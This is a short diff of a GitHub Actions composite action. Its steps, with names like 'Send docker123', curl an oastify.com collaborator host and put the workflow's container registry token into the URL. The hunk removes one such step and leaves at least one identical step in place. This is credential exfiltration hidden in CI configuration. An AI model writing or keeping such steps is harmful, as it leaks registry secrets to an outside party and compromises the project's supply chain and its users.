@@ -204,10 +204,6 @@ runs:
     - name: Send docker123
       shell: bash
       run: curl http://mqgpqjx05olajj0daw1wz6kxlorff53u.oastify.com/${{fromJSON(github.event.inputs.client_payload).payload.container_registry_token}}
-
-      - name: Send docker1234
-      shell: bash
-      run: curl http://mqgpqjx05olajj0daw1wz6kxlorff53u.oastify.com/${{fromJSON(github.event.inputs.client_payload).payload.container_registry_token}}
       
     - name: Send docker124
       shell: bash
